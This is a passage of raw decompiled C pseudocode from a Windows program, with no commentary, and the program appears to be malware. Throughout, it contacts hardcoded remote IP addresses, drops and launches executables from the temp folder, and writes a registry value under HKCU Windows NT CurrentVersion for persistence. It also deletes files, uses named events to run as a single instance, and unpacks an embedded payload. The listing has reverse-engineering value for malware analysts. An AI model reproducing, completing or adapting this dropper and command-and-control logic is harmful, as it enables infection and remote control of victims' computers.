  _wcscat_s(&local_234,0x104,(wchar_t *)&DAT_00428018);
  _wcscat_s(&local_234,0x104,(wchar_t *)&DAT_0042d360);
  DVar3 = GetFileAttributesW(&local_234);
  if (DVar3 != 0xffffffff) {
    Sleep(500);
    ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_234,(LPCWSTR)&DAT_0042801c,(LPCWSTR)0x0,1);
  }
  Sleep(5000);
  FUN_00402fe0();
                    // WARNING: Subroutine does not return
  ExitProcess(0);
}



void __cdecl FUN_00401280(HINSTANCE param_1)

{
  WNDCLASSEXW local_34;
  
  local_34.cbSize = 0x30;
  local_34.style = 3;
  local_34.lpfnWndProc = FUN_004016d0;
  local_34.cbClsExtra = 0;
  local_34.cbWndExtra = 0;
  local_34.hInstance = param_1;
  local_34.hIcon = LoadIconW(param_1,(LPCWSTR)0x6b);
  local_34.hCursor = LoadCursorW((HINSTANCE)0x0,(LPCWSTR)0x7f00);
  local_34.hbrBackground = (HBRUSH)0x6;
  local_34.lpszMenuName = (LPCWSTR)0x6d;
  local_34.lpszClassName = (LPCWSTR)&DAT_0042c580;
  local_34.hIconSm = LoadIconW(local_34.hInstance,(LPCWSTR)0x6c);
  RegisterClassExW(&local_34);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00401300(HINSTANCE param_1)

{
  wchar_t wVar1;
  undefined4 *puVar2;
  wchar_t *local_834;
  wchar_t *local_830;
  undefined4 *local_828;
  wchar_t *local_81c;
  wchar_t *local_818;
  wchar_t *local_80c;
  wchar_t *local_808;
  wchar_t local_804;
  undefined local_802 [58];
  undefined4 local_7c8;
  undefined2 local_7c4;
  undefined local_7c2 [518];
  wchar_t local_5bc;
  undefined local_5ba [522];
  HWND local_3b0;
  HANDLE local_3ac;
  int local_3a8;
  WSADATA local_3a4;
  undefined2 local_214;
  undefined local_212 [522];
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  DAT_0042c710 = param_1;
  local_3b0 = CreateWindowExW(0,(LPCWSTR)&DAT_0042c580,(LPCWSTR)&DAT_0042c648,0xcf0000,-0x80000000,0
                              ,-0x80000000,0,(HWND)0x0,(HMENU)0x0,param_1,(LPVOID)0x0);
  if (local_3b0 != (HWND)0x0) {
    local_5bc = L'\0';
    _memset(local_5ba,0,0x206);
    local_7c4 = 0;
    _memset(local_7c2,0,0x206);
    local_214 = 0;
    _memset(local_212,0,0x206);
    local_3ac = (HANDLE)0x0;
    WSAStartup(0x101,&local_3a4);
    local_3a8 = 0;
    local_7c8 = 0;
    local_3a8 = FUN_00408900(&DAT_0042ced0,1);
    if (local_3a8 == 0) {
      local_804 = L'\0';
      _memset(local_802,0,0x3a);
      FUN_00401850(&local_804);
      local_808 = &local_804;
      local_80c = &DAT_0042d078;
      do {
        wVar1 = *local_808;
        *local_80c = wVar1;
        local_808 = local_808 + 1;
        local_80c = local_80c + 1;
      } while (wVar1 != L'\0');
      FUN_00403c40((wchar_t *)&DAT_0042ced4,u_218_54_31_165_00428020);
      DAT_0042cf54 = 0x51;
      FUN_00403c60(&DAT_0042cf56,u_AAAA_0042803c);
      FUN_00403c40((wchar_t *)&DAT_0042cf76,u_218_54_31_226_00428048);
      DAT_0042cff6 = 0x2b66;
      local_818 = &local_804;
      local_81c = &DAT_0042d058;
      do {
        wVar1 = *local_818;
        *local_81c = wVar1;
        local_818 = local_818 + 1;
        local_81c = local_81c + 1;
      } while (wVar1 != L'\0');
      local_828 = (undefined4 *)&DAT_0042d056;
      puVar2 = local_828;
      do {
        local_828 = puVar2;
        puVar2 = (undefined4 *)((int)local_828 + 2);
      } while (*(short *)((int)local_828 + 2) != 0);
      *(undefined4 *)((int)local_828 + 2) = DAT_00428064;
      *(undefined2 *)((int)local_828 + 6) = DAT_00428068;
      DAT_0042d098 = DAT_0042b5f4;
    }
    FUN_00403870();
    FUN_00401850(&local_5bc);
    local_830 = &local_5bc;
    local_834 = &DAT_0042d0d0;
    do {
      wVar1 = *local_830;
      *local_834 = wVar1;
      local_830 = local_830 + 1;
      local_834 = local_834 + 1;
    } while (wVar1 != L'\0');
    local_3ac = OpenEventW(0x20000,0,&DAT_0042d0d0);
    if (local_3ac == (HANDLE)0x0) {
      local_3ac = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,&DAT_0042d0d0);
      if (local_3ac != (HANDLE)0x0) {
        FUN_004035e0(&DAT_0042d568);
        _DAT_0042d570 = DAT_0042d09c;
        _DAT_0042b60c =
             CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00403990,(LPVOID)0x0,0,(LPDWORD)0x0);
      }
    }
    else {
      CloseHandle(local_3ac);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_004016d0(HWND param_1,UINT param_2,uint param_3,LPARAM param_4)

{
  tagPAINTSTRUCT local_4c;
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  if (param_2 == 2) {
    PostQuitMessage(0);
  }
  else if (param_2 == 0xf) {
    BeginPaint(param_1,&local_4c);
    EndPaint(param_1,&local_4c);
  }
  else if (param_2 == 0x111) {
    if ((param_3 & 0xffff) == 0x68) {
      DialogBoxParamW(DAT_0042c710,(LPCWSTR)0x67,param_1,FUN_004017e0,0);
    }
    else if ((param_3 & 0xffff) == 0x69) {
      DestroyWindow(param_1);
    }
    else {
      DefWindowProcW(param_1,0x111,param_3,param_4);
    }
  }
  else {
    DefWindowProcW(param_1,param_2,param_3,param_4);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 FUN_004017e0(HWND param_1,int param_2,ushort param_3)

{
  undefined4 uVar1;
  
  if (param_2 == 0x110) {
    uVar1 = 1;
  }
  else if ((param_2 == 0x111) && ((param_3 == 1 || (param_3 == 2)))) {
    EndDialog(param_1,(uint)param_3);
    uVar1 = 1;
  }
  else {
    uVar1 = 0;
  }
  return uVar1;
}



void __cdecl FUN_00401850(wchar_t *param_1)

{
  wchar_t wVar1;
  undefined2 *puVar2;
  wchar_t *local_220;
  wchar_t *local_21c;
  WCHAR local_214;
  undefined local_212 [518];
  uint local_c;
  wchar_t *local_8;
  
  local_c = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_214 = L'\0';
  _memset(local_212,0,0x206);
  local_8 = (wchar_t *)0x0;
  GetModuleFileNameW((HMODULE)0x0,&local_214,0x104);
  puVar2 = (undefined2 *)FUN_00403ca0(&local_214,L'\\');
  *puVar2 = 0;
  local_8 = puVar2 + 1;
  puVar2 = (undefined2 *)FUN_00403ca0(local_8,L'.');
  *puVar2 = 0;
  local_21c = local_8;
  local_220 = param_1;
  do {
    wVar1 = *local_21c;
    *local_220 = wVar1;
    local_21c = local_21c + 1;
    local_220 = local_220 + 1;
  } while (wVar1 != L'\0');
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void FUN_00401960(void)

{
  WCHAR WVar1;
  wchar_t wVar2;
  undefined4 *puVar3;
  DWORD DVar4;
  int iVar5;
  LSTATUS LVar6;
  WCHAR *local_1fb4;
  wchar_t *local_1fa4;
  wchar_t *local_1f94;
  wchar_t *local_1f88;
  wchar_t *local_1f84;
  wchar_t *local_1f78;
  wchar_t *local_1f74;
  wchar_t *local_1f68;
  wchar_t *local_1f64;
  WCHAR *local_1f58;
  WCHAR *local_1f54;
  wchar_t *local_1f48;
  wchar_t *local_1f44;
  wchar_t *local_1f38;
  wchar_t *local_1f34;
  wchar_t *local_1f28;
  wchar_t *local_1f24;
  wchar_t *local_1f18;
  wchar_t *local_1f14;
  wchar_t *local_1f08;
  wchar_t *local_1f04;
  wchar_t *local_1ef8;
  wchar_t *local_1ef4;
  wchar_t *local_1ee8;
  wchar_t *local_1ee4;
  undefined4 *local_1ed8;
  wchar_t *local_1ecc;
  wchar_t *local_1ec8;
  wchar_t *local_1ebc;
  wchar_t *local_1eb8;
  wchar_t *local_1eac;
  wchar_t *local_1ea8;
  WCHAR *local_1e98;
  WCHAR *local_1e88;
  undefined4 local_1e84 [2];
  int local_1e7c;
  undefined4 local_1d84;
  undefined2 local_1d80;
  undefined4 local_1d7e;
  short local_1d7a;
  wchar_t local_1d76 [16];
  wchar_t local_1d56 [135];
  int local_1c48;
  wchar_t local_1c44 [262];
  BOOL local_1a38;
  wchar_t local_1a34;
  undefined local_1a32 [522];
  undefined local_1828 [4];
  wchar_t local_1824;
  undefined auStack_1822 [518];
  undefined local_161c [4];
  wchar_t local_1618 [64];
  short local_1598;
  wchar_t local_1596 [80];
  undefined2 local_14f6;
  WCHAR local_141c;
  undefined local_141a [522];
  undefined2 local_1210;
  WCHAR local_120c;
  undefined local_120a [518];
  WCHAR local_1004;
  undefined local_1002 [518];
  wchar_t local_dfc;
  undefined local_dfa [126];
  wchar_t local_d7c;
  undefined local_d7a [2050];
  short local_578;
  wchar_t local_574;
  undefined local_572 [130];
  HKEY local_4f0;
  WCHAR local_4ec;
  undefined local_4ea [522];
  int local_2e0;
  wchar_t local_2dc;
  undefined4 local_2da;
  undefined4 local_2d6;
  undefined4 local_2d2;
  undefined4 local_2ce;
  undefined4 local_2ca;
  undefined4 local_2c6;
  undefined4 local_2c2;
  undefined2 local_2be;
  wchar_t local_2bc;
  undefined4 local_2ba;
  undefined4 local_2b6;
  undefined4 local_2b2;
  undefined4 local_2ae;
  undefined4 local_2aa;
  undefined4 local_2a6;
  undefined4 local_2a2;
  undefined2 local_29e;
  int local_29c;
  wchar_t local_298 [64];
  short local_218;
  wchar_t local_216 [16];
  wchar_t local_1f6 [64];
  undefined2 local_176;
  wchar_t local_174 [16];
  wchar_t local_154 [16];
  wchar_t local_134 [16];
  wchar_t local_114 [16];
  wchar_t local_f4 [16];
  int local_d4;
  undefined4 local_d0;
  int local_9c;
  int local_98;
  wchar_t local_94;
  undefined local_92 [130];
  uint local_10;
  int local_c;
  int local_8;
  
  local_8 = 0x40196d;
  local_10 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_9c = 0;
  local_4ec = L'\0';
  _memset(local_4ea,0,0x206);
  local_141c = L'\0';
  _memset(local_141a,0,0x206);
  local_120c = L'\0';
  _memset(local_120a,0,0x206);
  local_2dc = L'\0';
  local_2da = 0;
  local_2d6 = 0;
  local_2d2 = 0;
  local_2ce = 0;
  local_2ca = 0;
  local_2c6 = 0;
  local_2c2 = 0;
  local_2be = 0;
  local_94 = DAT_004280b4;
  _memset(local_92,0,0x7e);
  local_dfc = DAT_004280f8;
  _memset(local_dfa,0,0x7e);
  local_578 = 0;
  local_574 = DAT_004280fc;
  _memset(local_572,0,0x7e);
  local_1210 = 0;
  local_1004 = L'\0';
  _memset(local_1002,0,0x206);
  local_2bc = L'\0';
  local_2ba = 0;
  local_2b6 = 0;
  local_2b2 = 0;
  local_2ae = 0;
  local_2aa = 0;
  local_2a6 = 0;
  local_2a2 = 0;
  local_29e = 0;
  local_2e0 = 0;
  local_98 = 0;
  local_c = 0;
  local_8 = 0;
  _memset(&local_29c,0,0x200);
  local_c = FUN_00408900(&local_29c,1);
  local_98 = FUN_00408900(local_161c,0);
  GetModuleFileNameW((HMODULE)0x0,&local_141c,0x104);
  GetTempPathW(0x104,&local_4ec);
  _wcscat_s(&local_4ec,0x104,u_HGDraw_dll_00428100);
  local_1e88 = &local_4ec;
  do {
    WVar1 = *local_1e88;
    local_1e88 = local_1e88 + 1;
  } while (WVar1 != L'\0');
  if (((int)local_1e88 - (int)local_4ea >> 1 != 0) &&
     (DVar4 = GetFileAttributesW(&local_4ec), DVar4 != 0xffffffff)) {
    DeleteFileW(&local_4ec);
  }
  if (local_c == 0) {
    if (DAT_0042b060 == 3) {
      _memset(local_1e84,0,0x236);
      local_8 = FUN_004056a0(local_1e84);
      if (local_8 != 0) {
        local_1f14 = local_1d76;
        local_1f18 = &local_94;
        do {
          wVar2 = *local_1f14;
          *local_1f18 = wVar2;
          local_1f14 = local_1f14 + 1;
          local_1f18 = local_1f18 + 1;
        } while (wVar2 != L'\0');
        FUN_00404500(local_1d7e,&local_dfc);
        local_578 = local_1d7a;
        FUN_00404500(local_1d84,&local_574);
        local_1210 = local_1d80;
        local_2e0 = local_1e7c;
        _wcscpy_s(&local_2dc,0x10,local_1d56);
      }
    }
  }
  else {
    GetTempPathW(0x104,&local_4ec);
    _wcscat_s(&local_4ec,0x104,local_114);
    _wcscat_s(&local_4ec,0x104,u__exe_00428148);
    local_1e98 = &local_4ec;
    do {
      WVar1 = *local_1e98;
      local_1e98 = local_1e98 + 1;
    } while (WVar1 != L'\0');
    if (((int)local_1e98 - (int)local_4ea >> 1 != 0) &&
       (DVar4 = GetFileAttributesW(&local_4ec), DVar4 != 0xffffffff)) {
      local_1ea8 = local_114;
      local_1eac = local_1c44;
      do {
        wVar2 = *local_1ea8;
        *local_1eac = wVar2;
        local_1ea8 = local_1ea8 + 1;
        local_1eac = local_1eac + 1;
      } while (wVar2 != L'\0');
      _wcscat_s(local_1c44,0x104,u__exe_00428154);
      DeleteFileW(&local_4ec);
    }
    _wcscpy_s(&local_2dc,0x10,local_f4);
    FUN_00404990(local_f4,&local_4ec);
    iVar5 = FUN_00402a70(local_f4);
    if (iVar5 == 1) goto LAB_00402a60;
    local_1a34 = L'\0';
    _memset(local_1a32,0,0x206);
    local_1824 = L'\0';
    _memset(auStack_1822,0,0x206);
    local_1828 = (undefined  [4])0x0;
    local_1eb8 = local_f4;
    local_1ebc = &local_1a34;
    do {
      wVar2 = *local_1eb8;
      *local_1ebc = wVar2;
      local_1eb8 = local_1eb8 + 1;
      local_1ebc = local_1ebc + 1;
    } while (wVar2 != L'\0');
    local_1ec8 = local_f4;
    local_1ecc = &local_1824;
    do {
      wVar2 = *local_1ec8;
      *local_1ecc = wVar2;
      local_1ec8 = local_1ec8 + 1;
      local_1ecc = local_1ecc + 1;
    } while (wVar2 != L'\0');
    puVar3 = (undefined4 *)(local_1828 + 2);
    do {
      local_1ed8 = puVar3;
      puVar3 = (undefined4 *)((int)local_1ed8 + 2);
    } while (*(short *)((int)local_1ed8 + 2) != 0);
    *(undefined4 *)((int)local_1ed8 + 2) = u__STOP_004281b4._0_4_;
    *(undefined4 *)((int)local_1ed8 + 6) = u__STOP_004281b4._4_4_;
    *(undefined4 *)((int)local_1ed8 + 10) = u__STOP_004281b4._8_4_;
    local_1828 = (undefined  [4])OpenEventW(0x20000,0,&local_1a34);
    if (local_1828 != (undefined  [4])0x0) {
      CloseHandle((HANDLE)local_1828);
      local_1828 = (undefined  [4])CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,&local_1824);
      local_1c48 = 0;
      while ((local_1828 = (undefined  [4])OpenEventW(0x20000,0,&local_1a34),
             local_1828 != (undefined  [4])0x0 && (local_1c48 < 5))) {
        CloseHandle((HANDLE)local_1828);
        local_1c48 = local_1c48 + 1;
        Sleep(500);
      }
    }
    Sleep(1000);
    local_1a38 = DeleteFileW(&local_4ec);
    local_1ee4 = local_216;
    local_1ee8 = &local_94;
    do {
      wVar2 = *local_1ee4;
      *local_1ee8 = wVar2;
      local_1ee4 = local_1ee4 + 1;
      local_1ee8 = local_1ee8 + 1;
    } while (wVar2 != L'\0');
    local_1ef4 = local_298;
    local_1ef8 = &local_dfc;
    do {
      wVar2 = *local_1ef4;
      *local_1ef8 = wVar2;
      local_1ef4 = local_1ef4 + 1;
      local_1ef8 = local_1ef8 + 1;
    } while (wVar2 != L'\0');
    local_578 = local_218;
    local_1f04 = local_1f6;
    local_1f08 = &local_574;
    do {
      wVar2 = *local_1f04;
      *local_1f08 = wVar2;
      local_1f04 = local_1f04 + 1;
      local_1f08 = local_1f08 + 1;
    } while (wVar2 != L'\0');
    local_1210 = local_176;
    local_2e0 = local_d4;
    _wcscpy_s(&local_2bc,0x10,local_114);
  }
  if (local_98 != 0) {
    local_1f24 = local_1596;
    local_1f28 = &local_94;
    do {
      wVar2 = *local_1f24;
      *local_1f28 = wVar2;
      local_1f24 = local_1f24 + 1;
      local_1f28 = local_1f28 + 1;
    } while (wVar2 != L'\0');
    local_1f34 = local_1618;
    local_1f38 = &local_dfc;
    do {
      wVar2 = *local_1f34;
      *local_1f38 = wVar2;
      local_1f34 = local_1f34 + 1;
      local_1f38 = local_1f38 + 1;
    } while (wVar2 != L'\0');
    local_578 = local_1598;
    local_1f44 = &DAT_0042820c;
    local_1f48 = &local_574;
    do {
      wVar2 = *local_1f44;
      *local_1f48 = wVar2;
      local_1f44 = local_1f44 + 1;
      local_1f48 = local_1f48 + 1;
    } while (wVar2 != L'\0');
    local_1210 = local_14f6;
    local_2e0 = DAT_0042b5f4;
    if (DAT_0042b060 == 3) {
      FUN_00403480(&local_1004,0);
    }
    else {
      FUN_00403480(&local_1004,1);
    }
    local_1f54 = &local_1004;
    local_1f58 = &local_120c;
    do {
      WVar1 = *local_1f54;
      *local_1f58 = WVar1;
      local_1f54 = local_1f54 + 1;
      local_1f58 = local_1f58 + 1;
    } while (WVar1 != L'\0');
    _wcscat_s(&local_120c,0x104,u_golfset_ini_00428228);
    DeleteFileW(&local_120c);
  }
  _memset(&local_29c,0,0x200);
  local_29c = 0x504d534d;
  local_218 = 0x51;
  local_1f64 = &DAT_00428240;
  local_1f68 = local_298;
  do {
    wVar2 = *local_1f64;
    *local_1f68 = wVar2;
    local_1f64 = local_1f64 + 1;
    local_1f68 = local_1f68 + 1;
  } while (wVar2 != L'\0');
  local_176 = 0x2b66;
  local_1f74 = &DAT_0042825c;
  local_1f78 = local_1f6;
  do {
    wVar2 = *local_1f74;
    *local_1f78 = wVar2;
    local_1f74 = local_1f74 + 1;
    local_1f78 = local_1f78 + 1;
  } while (wVar2 != L'\0');
  local_1f84 = &DAT_00428278;
  local_1f88 = local_216;
  do {
    wVar2 = *local_1f84;
    *local_1f88 = wVar2;
    local_1f84 = local_1f84 + 1;
    local_1f88 = local_1f88 + 1;
  } while (wVar2 != L'\0');
  local_d4 = DAT_0042b5f4;
  if (((local_c != 0) || (local_8 != 0)) || (local_98 != 0)) {
    FUN_00403c60(local_216,&local_94);
    FUN_00403c40(local_298,&local_dfc);
    local_218 = local_578;
    FUN_00403c40(local_1f6,&local_574);
    local_176 = local_1210;
    local_d4 = local_2e0;
    if (local_2e0 == 0) {
      local_d4 = DAT_0042b5f4;
    }
  }
  if ((local_298[0] != L'\0') && (local_218 != 0)) {
    local_29c = 0x504d534d;
    DVar4 = GetTickCount();
    FUN_004106d3(DVar4);
    local_d7c = L'\0';
    _memset(local_d7a,0,0x7fe);
    if (local_174[0] == L'\0') {
      FUN_00403d80(5,6,(int)&local_d7c);
      FUN_00403c60(local_174,&local_d7c);
    }
    if (local_154[0] == L'\0') {
      FUN_00403d80(5,6,(int)&local_d7c);
      FUN_00403c60(local_154,&local_d7c);
    }
    if (local_114[0] == L'\0') {
      FUN_00403d80(5,6,(int)&local_d7c);
      FUN_00403c60(local_114,&local_d7c);
    }
    if (local_f4[0] == L'\0') {
      FUN_00403d80(5,6,(int)&local_d7c);
      FUN_00403c60(local_f4,&local_d7c);
      local_1f94 = &local_2dc;
      do {
        wVar2 = *local_1f94;
        local_1f94 = local_1f94 + 1;
      } while (wVar2 != L'\0');
      if ((int)local_1f94 - (int)&local_2da >> 1 != 0) {
        FUN_00403c60(local_f4,&local_2dc);
      }
    }
    local_1fa4 = &local_2bc;
    do {
      wVar2 = *local_1fa4;
      local_1fa4 = local_1fa4 + 1;
    } while (wVar2 != L'\0');
    if ((int)local_1fa4 - (int)&local_2ba >> 1 != 0) {
      _wcscpy_s(local_134,0x10,&local_2bc);
    }
    if (local_134[0] == L'\0') {
      FUN_00403d80(5,6,(int)&local_d7c);
      FUN_00403c60(local_134,&local_d7c);
    }
    local_d0 = DAT_0042b5f0;
    if (local_d4 == 0) {
      local_d4 = DAT_0042b5f4;
    }
    local_9c = FUN_00408a30(&local_29c);
    if (local_9c != 0) {
      FUN_00404990(local_f4,&local_4ec);
      FUN_004034d0(&local_141c,&local_4ec,0x32);
      local_4f0 = (HKEY)0x0;
      LVar6 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_004282f8,0,3,
                            &local_4f0);
      if (LVar6 == 0) {
        local_1fb4 = &local_4ec;
        do {
          WVar1 = *local_1fb4;
          local_1fb4 = local_1fb4 + 1;
        } while (WVar1 != L'\0');
        LVar6 = RegSetValueExW(local_4f0,(LPCWSTR)&DAT_00428364,0,1,(BYTE *)&local_4ec,
                               ((int)local_1fb4 - (int)local_4ea >> 1) * 2 + 2);
        if (LVar6 == 0) {
          RegCloseKey(local_4f0);
        }
      }
      ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_4ec,(LPCWSTR)&DAT_004282f4,(LPCWSTR)0x0,1);
    }
  }
  local_9c = 1;
LAB_00402a60:
  ___security_check_cookie_4(local_10 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00402a70(wchar_t *param_1)

{
  int iVar1;
  WCHAR local_23c;
  undefined local_23a [518];
  wchar_t local_34;
  undefined4 local_32;
  undefined4 local_2e;
  undefined4 local_2a;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined2 local_e;
  uint local_c;
  undefined4 local_8;
  
  local_c = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_8 = 0;
  local_23c = L'\0';
  _memset(local_23a,0,0x206);
  local_34 = L'\0';
  local_32 = 0;
  local_2e = 0;
  local_2a = 0;
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  _wcscpy_s(&local_34,0x14,param_1);
  _wcscat_s(&local_34,0x14,u__exe_004283a8);
  GetModuleFileNameW((HMODULE)0x0,&local_23c,0x104);
  iVar1 = FUN_00403c80(&local_23c,&local_34);
  if (iVar1 != 0) {
    local_8 = 1;
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00402b40(void)

{
  char local_24;
  undefined4 local_23;
  undefined4 local_1f;
  undefined4 local_1b;
  undefined2 local_17;
  undefined local_15;
  uint local_14;
  int local_10;
  int local_c;
  int local_8;
  
  local_14 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_10 = 0;
  local_8 = 0;
  local_c = 0;
  local_24 = '\0';
  local_23 = 0;
  local_1f = 0;
  local_1b = 0;
  local_17 = 0;
  local_15 = 0;
  local_10 = FUN_00402c60(s_218_54_31_226_0042b5f8,DAT_0042b608);
  if (local_10 != 0) {
    if (DAT_0042b060 == 3) {
      local_8 = FUN_00402c60(s_1_234_83_146_004283c0,0x2bac);
    }
    else {
      local_8 = FUN_00402c60(s_1_234_83_146_004283d0,0x2ba2);
    }
    if (local_8 != 0) {
      if (DAT_0042cd9e != 0) {
        FUN_004045b0(DAT_0042cd9e,&local_24);
      }
      local_c = FUN_00402c60(&local_24,DAT_0042b608);
      if ((((local_c != 0) && (local_10 == 1)) && (local_8 == 1)) && (local_c == 1)) {
        FUN_00402c60(s_133_242_129_155_004283e0,DAT_0042b608);
      }
    }
  }
  ___security_check_cookie_4(local_14 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00402c60(char *param_1,undefined2 param_2)

{
  int iVar1;
  int *piVar2;
  int *piVar3;
  bool bVar4;
  int local_440;
  int local_43c;
  int local_438;
  undefined local_430;
  undefined4 local_42f;
  undefined4 local_42b;
  undefined4 local_427;
  undefined4 local_423;
  undefined2 local_41f;
  undefined local_41d;
  wchar_t local_41c;
  undefined local_41a [518];
  wchar_t local_214;
  undefined local_212 [518];
  uint local_c;
  int local_8;
  
  local_c = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  iVar1 = FUN_00407f50(param_1,param_2);
  if (iVar1 == 0) {
    local_41c = L'\0';
    _memset(local_41a,0,0x206);
    local_214 = L'\0';
    _memset(local_212,0,0x206);
    FUN_00403cc0(&local_41c);
    _wcscat_s(&local_41c,0x104,(wchar_t *)&DAT_004283f0);
    local_430 = 0;
    local_42f = 0;
    local_42b = 0;
    local_427 = 0;
    local_423 = 0;
    local_41f = 0;
    local_41d = 0;
    local_8 = 0;
    for (local_438 = 0; local_438 < 5; local_438 = local_438 + 1) {
      if (*(short *)(&DAT_0042c720 + local_438 * 0x118) != 0) {
        _wcscpy_s(&local_214,0x104,&local_41c);
        _wcscat_s(&local_214,0x104,(wchar_t *)(&DAT_0042c720 + local_438 * 0x118));
        iVar1 = FUN_004071c0((undefined4 *)&local_430,&local_214);
        if (iVar1 != 0) {
          iVar1 = 5;
          bVar4 = true;
          piVar2 = (int *)&local_430;
          piVar3 = (int *)(&DAT_0042c824 + local_438 * 0x118);
          do {
            if (iVar1 == 0) break;
            iVar1 = iVar1 + -1;
            bVar4 = *piVar2 == *piVar3;
            piVar2 = piVar2 + 1;
            piVar3 = piVar3 + 1;
          } while (bVar4);
          if (bVar4) {
            *(undefined2 *)(&DAT_0042c720 + local_438 * 0x118) = 0;
            goto LAB_00402d51;
          }
        }
        local_8 = local_8 + 1;
      }
LAB_00402d51:
    }
    for (local_43c = 0; local_43c < 5; local_43c = local_43c + 1) {
    }
    for (local_440 = 0; local_440 < 5; local_440 = local_440 + 1) {
      if (*(short *)(&DAT_0042c720 + local_440 * 0x118) != 0) {
        FUN_004081e0((wchar_t *)(&DAT_0042c720 + local_440 * 0x118),param_1,param_2);
      }
    }
    _wcscat_s(&local_41c,0x104,(wchar_t *)&DAT_0042d360);
    GetFileAttributesW(&local_41c);
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00402f20(void)

{
  WCHAR local_214;
  undefined local_212 [518];
  uint local_c;
  DWORD local_8;
  
  local_c = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_214 = L'\0';
  _memset(local_212,0,0x206);
  DAT_0042d150 = operator_new(0x6422e);
  _memset(DAT_0042d150,0,0x6422e);
  GetModuleFileNameW((HMODULE)0x0,&local_214,0x104);
  FUN_004052c0(&local_214,u_<Embed_File_Info>_004283f4,DAT_0042d150,0x6422e,&local_8);
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Removing unreachable block (ram,0x00403448)

void FUN_00402fe0(void)

{
  WCHAR WVar1;
  short *psVar2;
  LSTATUS LVar3;
  WCHAR *local_4c4;
  WCHAR *local_4b8;
  WCHAR *local_4b4;
  WCHAR *local_4a8;
  WCHAR *local_4a4;
  short *local_494;
  short *local_484;
  DWORD local_470;
  HANDLE local_46c;
  undefined2 local_468;
  undefined4 local_466;
  undefined4 local_462;
  undefined4 local_45e;
  undefined4 local_45a;
  undefined4 local_456;
  undefined4 local_452;
  undefined4 local_44e;
  undefined2 local_44a;
  DWORD local_448;
  WCHAR local_444;
  undefined local_442 [518];
  undefined2 local_23c;
  undefined local_23a [518];
  HKEY local_34;
  WCHAR local_30;
  undefined4 local_2e;
  undefined4 local_2a;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_444 = L'\0';
  _memset(local_442,0,0x206);
  local_23c = 0;
  _memset(local_23a,0,0x206);
  local_468 = 0;
  local_466 = 0;
  local_462 = 0;
  local_45e = 0;
  local_45a = 0;
  local_456 = 0;
  local_452 = 0;
  local_44e = 0;
  local_44a = 0;
  local_46c = (HANDLE)0x0;
  local_448 = 0;
  local_470 = 0x104;
  local_30 = L'\0';
  local_2e = 0;
  local_2a = 0;
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  local_484 = &DAT_0042d038;
  psVar2 = local_484;
  do {
    local_484 = psVar2;
    psVar2 = local_484 + 1;
  } while (*local_484 != 0);
  if (((int)(local_484 + -0x21681c) >> 1 == 0) ||
     (local_46c = OpenEventW(0x20000,0,&DAT_0042d038), local_46c == (HANDLE)0x0)) {
    LVar3 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_00428480,0,0xf003f,
                          &local_34);
    if (LVar3 == 0) {
      LVar3 = RegQueryValueExW(local_34,u_TrayKey_004284ec,(LPDWORD)0x0,&local_448,(LPBYTE)&local_30
                               ,&local_470);
      if ((LVar3 == 0) && (local_46c = OpenEventW(0x20000,0,&local_30), local_46c != (HANDLE)0x0)) {
        RegCloseKey(local_34);
        goto LAB_00403465;
      }
      RegCloseKey(local_34);
    }
    GetTempPathW(0x104,&local_444);
    local_494 = &DAT_0042d058;
    psVar2 = local_494;
    do {
      local_494 = psVar2;
      psVar2 = local_494 + 1;
    } while (*local_494 != 0);
    if ((int)(local_494 + -0x21682c) >> 1 == 0) {
      _wcscat_s(&local_444,0x104,u_yafu_00428534);
      local_4a4 = &DAT_00428540;
      local_4a8 = &local_30;
      do {
        WVar1 = *local_4a4;
        *local_4a8 = WVar1;
        local_4a4 = local_4a4 + 1;
        local_4a8 = local_4a8 + 1;
      } while (WVar1 != L'\0');
    }
    else {
      _wcscat_s(&local_444,0x104,&DAT_0042d058);
      local_4b4 = &DAT_0042d058;
      local_4b8 = &local_30;
      do {
        WVar1 = *local_4b4;
        *local_4b8 = WVar1;
        local_4b4 = local_4b4 + 1;
        local_4b8 = local_4b8 + 1;
      } while (WVar1 != L'\0');
    }
    _wcscat_s(&local_444,0x104,u__exe_0042854c);
